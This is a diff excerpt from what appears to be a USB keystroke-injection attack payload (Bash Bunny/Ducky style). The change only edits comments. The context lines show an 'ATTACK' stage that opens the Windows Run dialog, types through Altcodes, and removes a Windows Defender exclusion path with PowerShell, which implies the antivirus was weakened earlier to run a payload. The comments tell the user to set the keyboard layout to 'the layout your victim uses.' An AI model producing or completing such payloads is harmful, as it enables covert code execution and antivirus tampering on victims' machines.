@@ -18,8 +18,7 @@ GET TARGET_HOSTNAME
 # Attack
 LED ATTACK
 
-# Change the keyboard layout to en-US with Altcode. I tried it with DUCKY_LANG but in my case, the "ch" language
-# can't print all symbols, so it doesn't work. This is just to make that it works 100%.
+# Change the keyboard layout to en-US with Altcode. I tried it with DUCKY_LANG but in my case, the "ch" language can't print all symbols, so it doesn't work
 # Delete this if you already have an en-US keyboard layout
 Q GUI r
 Q ALTCODE 45
@@ -104,8 +103,8 @@ Q STRING "Remove-MpPreference -ExclusionPath \"\$BLABEL\""
 Q ENTER
 
 # Sets the keyboard layout back to normal
-# Replace de "de-CH" with the layout your victim uses. In my case, it is "de-CH" because I live in swiss. It is important to change it
-# that because you probably don't live in switzerland.
+# Replace de "de-CH" with the layout your victim uses. In my case, it is "de-CH" because I live in swiss.
+# It is important to change that because you probably don't live in switzerland.
 Q STRING "Set-WinUserLanguageList -LanguageList de-CH -force;"
 Q ENTER
 
